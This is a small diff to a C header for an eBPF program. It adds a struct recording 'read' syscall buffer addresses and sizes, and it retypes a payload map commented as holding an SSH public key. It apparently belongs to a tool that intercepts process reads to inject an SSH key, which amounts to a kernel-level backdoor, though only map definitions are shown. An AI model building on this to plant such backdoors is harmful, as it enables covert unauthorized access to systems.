@@ -18,13 +18,21 @@ struct
     __type(value, unsigned int); // value are always zero.
 } map_fds SEC(".maps");
 
+// struct to store the buffer mem id and buffer
+struct syscall_read_logging 
+{
+    long unsigned int buffer_addr; // char buffer pointer addr
+    long int calling_size; // read(size) store the size.
+};
+
 // Map to fold the buffer sized from 'read' calls
 struct
 {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
     __type(key, size_t);              // key is pid_tgid
-    __type(value, long unsigned int); // char buffer pointer location
+    // __type(value, long unsigned int); // char buffer pointer location
+    __type(value, struct syscall_read_logging); 
 } map_buff_addrs SEC(".maps");
 
 // Report Events
@@ -49,8 +57,8 @@ struct
 {
     __uint(type, BPF_MAP_TYPE_HASH);
     __uint(max_entries, 8192);
-    __type(key, size_t);                    // key is id
-    __type(value, struct custom_payload *); // value is ssh pub key
+    __type(key, __u8);                    // key is id
+    __type(value, struct custom_payload ); // value is ssh pub key
 } map_payload_buffer SEC(".maps");
 
 #endif
